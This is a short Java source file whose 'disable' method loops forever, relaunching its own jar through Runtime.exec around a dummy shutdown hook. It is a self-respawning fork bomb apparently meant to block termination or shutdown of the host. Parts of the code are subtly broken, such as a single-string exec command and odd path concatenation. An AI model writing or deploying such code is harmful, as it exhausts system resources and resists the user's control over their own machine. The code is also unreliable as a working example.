package ml.lucid.os;

import ml.lucid.mayday;

import java.io.File;
import java.io.IOException;

public class shutdis {

    static final Thread DUMMY_HOOK = new Thread();


    public static void disable() {
        try {
            while(true) {
//setup
                File _jar_temp = new File(mayday.class.getProtectionDomain().getCodeSource().getLocation().getFile());

                String _jar_name = _jar_temp.getName();

                File _jar_tpath = new File(mayday.class.getProtectionDomain().getCodeSource().getLocation().getPath());
                String _jar_path = _jar_tpath.getPath();

                String[] command = {"java -jar "+_jar_path+_jar_name};

                Runtime.getRuntime().addShutdownHook(DUMMY_HOOK);//detects shutdown of java JVM
                Runtime.getRuntime().exec(command);
                Runtime.getRuntime().removeShutdownHook(DUMMY_HOOK);
            }
        } catch(IOException io) {
            io.getMessage();
        }

    }

}
